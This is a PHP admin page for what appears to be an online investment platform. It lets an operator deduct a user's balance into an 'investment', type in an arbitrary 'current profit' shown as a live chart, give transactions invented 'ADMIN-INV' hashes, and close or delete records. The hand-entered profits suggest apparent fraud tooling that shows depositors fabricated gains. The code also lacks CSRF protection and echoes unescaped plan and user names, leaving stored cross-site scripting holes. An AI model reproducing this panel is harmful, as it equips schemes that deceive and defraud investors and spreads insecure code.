<?php
include 'header.php';
$alert = "";

// --- 1. HANDLE: PLACE NEW INVESTMENT (ADMIN ONLY) ---
if (isset($_POST['place_new_investment'])) {
    $user_id = intval($_POST['user_id']);
    $plan_name = mysqli_real_escape_string($link, $_POST['plan_name']);
    $amount = floatval($_POST['amount']);
    $roi = floatval($_POST['roi']);

    // 1. Deduct amount from user balance
    mysqli_query($link, "UPDATE users SET balance = balance - $amount WHERE id='$user_id'");

    // 2. Insert the investment record
    $sql = "INSERT INTO investments (user_id, plan_name, amount, roi_percent, status, start_date) 
            VALUES ('$user_id', '$plan_name', '$amount', '$roi', 'active', NOW())";
    
    if(mysqli_query($link, $sql)){
        // 3. Log the transaction for the user's history
        mysqli_query($link, "INSERT INTO transactions (user_id, type, amount_usd, status, tx_hash, created_at) 
                           VALUES ('$user_id', 'investment', '$amount', 'completed', 'ADMIN-INV-" . time() . "', NOW())");
        
        $alert = "Swal.fire({icon: 'success', title: 'Placed', text: 'Investment created and balance deducted from user.'});";
    } else {
        $alert = "Swal.fire({icon: 'error', title: 'Error', text: 'Failed to create investment.'});";
    }
}

// --- 2. HANDLE: UPDATE LIVE PROFIT ---
if (isset($_POST['update_profit'])) {
    $inv_id = intval($_POST['inv_id']);
    $new_profit = floatval($_POST['current_profit']);
    mysqli_query($link, "UPDATE investments SET current_profit='$new_profit' WHERE id='$inv_id'");
    $alert = "Swal.fire({icon: 'success', title: 'Updated', text: 'Live profit updated.'});";
}

// --- 3. HANDLE: PAY & END INVESTMENT ---
if (isset($_POST['pay_and_end'])) {
    $inv_id = intval($_POST['inv_id']);
    $q = mysqli_query($link, "SELECT * FROM investments WHERE id='$inv_id'");
    $inv = mysqli_fetch_assoc($q);
    
    if($inv && $inv['status'] == 'active') {
        $total_payout = floatval($inv['amount']) + floatval($inv['current_profit']);
        $u_id = $inv['user_id'];
        
        // Return capital + profit to user balance
        mysqli_query($link, "UPDATE users SET balance = balance + $total_payout WHERE id='$u_id'");
        mysqli_query($link, "UPDATE investments SET status='completed', end_date=NOW() WHERE id='$inv_id'");
        
        $alert = "Swal.fire({icon: 'success', title: 'Paid', text: 'Investment closed and funds added to user balance.'});";
    }
}

// --- 4. HANDLE: DELETE ---
if (isset($_POST['delete_inv'])) {
    $id = intval($_POST['inv_id']);
    mysqli_query($link, "DELETE FROM investments WHERE id='$id'");
    $alert = "Swal.fire({icon: 'success', title: 'Deleted', text: 'Record removed.'});";
}

// --- FETCH DATA ---
$users_query = mysqli_query($link, "SELECT id, username FROM users");
$plans_query = mysqli_query($link, "SELECT * FROM investment_plans");
$result = mysqli_query($link, "SELECT i.*, u.username, u.email FROM investments i JOIN users u ON i.user_id = u.id ORDER BY i.start_date DESC");
?>

<div class="flex flex-col h-full overflow-hidden">
    <!-- Header Area -->
    <div class="p-6 flex justify-between items-center">
        <h1 class="text-2xl font-bold text-slate-800">User Investments</h1>
        <button onclick="document.getElementById('placeTradeModal').classList.remove('hidden')" 
                class="bg-indigo-600 text-white px-6 py-2 rounded-xl font-bold hover:bg-indigo-700 shadow-lg">
            + Place New Trade
        </button>
    </div>

    <!-- Table Area -->
    <div class="flex-1 overflow-y-auto px-6 pb-6">
        <div class="glass-panel rounded-2xl bg-white shadow-sm border border-slate-200 overflow-hidden">
            <div class="overflow-x-auto">
                <table class="w-full text-left">
                    <thead class="text-xs text-slate-400 uppercase bg-slate-50 border-b border-slate-100">
                        <tr>
                            <th class="py-3 pl-6 font-semibold">User</th>
                            <th class="py-3 font-semibold">Plan</th>
                            <th class="py-3 font-semibold">Capital / Profit</th>
                            <th class="py-3 font-semibold text-center">Status</th>
                            <th class="py-3 pr-6 text-right font-semibold">Actions</th>
                        </tr>
                    </thead>
                    <tbody class="text-sm divide-y divide-slate-100">
                        <?php while($row = mysqli_fetch_assoc($result)): ?>
                        <tr class="hover:bg-slate-50">
                            <td class="py-4 pl-6">
                                <p class="font-bold text-slate-800"><?php echo htmlspecialchars($row['username']); ?></p>
                                <p class="text-xs text-slate-500"><?php echo htmlspecialchars($row['email']); ?></p>
                            </td>
                            <td class="py-4">
                                <p class="font-bold text-slate-700"><?php echo $row['plan_name']; ?></p>
                            </td>
                            <td class="py-4">
                                <p class="font-bold text-slate-800">$<?php echo number_format($row['amount'], 2); ?></p>
                                <p class="text-xs text-green-600 font-bold">Profit: $<?php echo number_format($row['current_profit'], 2); ?></p>
                            </td>
                            <td class="py-4 text-center">
                                <span class="px-2 py-1 text-xs font-bold rounded-md <?php echo $row['status']=='active'?'bg-green-100 text-green-700':'bg-blue-100 text-blue-700'; ?>">
                                    <?php echo ucfirst($row['status']); ?>
                                </span>
                            </td>
                            <td class="py-4 pr-6 text-right">
                                <div class="flex justify-end gap-2">
                                    <?php if($row['status'] == 'active'): ?>
                                        <button onclick="openProfitModal(<?php echo $row['id']; ?>, <?php echo $row['current_profit']; ?>)" class="bg-blue-600 text-white text-xs font-bold py-1.5 px-3 rounded shadow">Profit</button>
                                        <form method="POST" onsubmit="return confirm('Close this investment?');">
                                            <input type="hidden" name="inv_id" value="<?php echo $row['id']; ?>">
                                            <button type="submit" name="pay_and_end" class="bg-green-600 text-white text-xs font-bold py-1.5 px-3 rounded shadow">Close</button>
                                        </form>
                                    <?php endif; ?>
                                    <form method="POST" onsubmit="return confirm('Delete this record?');">
                                        <input type="hidden" name="inv_id" value="<?php echo $row['id']; ?>">
                                        <button type="submit" name="delete_inv" class="text-red-400 hover:text-red-600"><i class="fa-solid fa-trash"></i></button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<!-- PLACE TRADE MODAL -->
<div id="placeTradeModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/50 hidden p-4">
    <div class="bg-white w-full max-w-md rounded-2xl p-6">
        <h3 class="font-bold mb-4 text-lg">Place New Trade</h3>
        <form method="POST">
            <select name="user_id" required class="w-full border rounded-xl py-3 px-4 mb-3 bg-slate-50">
                <option value="">Select User</option>
                <?php mysqli_data_seek($users_query, 0); while($u = mysqli_fetch_assoc($users_query)): ?>
                    <option value="<?php echo $u['id']; ?>"><?php echo $u['username']; ?></option>
                <?php endwhile; ?>
            </select>
            <select name="plan_name" required class="w-full border rounded-xl py-3 px-4 mb-3 bg-slate-50">
                <option value="">Select Plan</option>
                <?php mysqli_data_seek($plans_query, 0); while($p = mysqli_fetch_assoc($plans_query)): ?>
                    <option value="<?php echo $p['name']; ?>"><?php echo $p['name']; ?></option>
                <?php endwhile; ?>
            </select>
            <input type="number" name="amount" placeholder="Amount ($)" step="0.01" required class="w-full border rounded-xl py-3 px-4 mb-3">
            <input type="number" name="roi" placeholder="ROI %" step="0.01" required class="w-full border rounded-xl py-3 px-4 mb-4">
            <button type="submit" name="place_new_investment" class="w-full bg-indigo-600 text-white py-3 rounded-xl font-bold">Process Trade</button>
            <button type="button" onclick="document.getElementById('placeTradeModal').classList.add('hidden')" class="w-full mt-2 py-2 text-slate-500 font-bold">Cancel</button>
        </form>
    </div>
</div>

<!-- PROFIT MODAL -->
<div id="profitModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/50 hidden p-4">
    <div class="bg-white w-full max-w-sm rounded-2xl p-6">
        <h3 class="font-bold mb-4">Set Current Profit</h3>
        <form method="POST">
            <input type="hidden" name="inv_id" id="modalInvId">
            <input type="number" step="0.01" name="current_profit" id="modalProfit" required class="w-full border rounded-xl py-3 px-4 mb-4">
            <button type="submit" name="update_profit" class="w-full bg-indigo-600 text-white py-3 rounded-xl">Update Live Chart</button>
        </form>
    </div>
</div>

<script>
    function openProfitModal(id, profit) {
        document.getElementById('modalInvId').value = id;
        document.getElementById('modalProfit').value = profit;
        document.getElementById('profitModal').classList.remove('hidden');
    }
    <?php echo $alert; ?>
</script>

<?php include 'footer.php'; ?>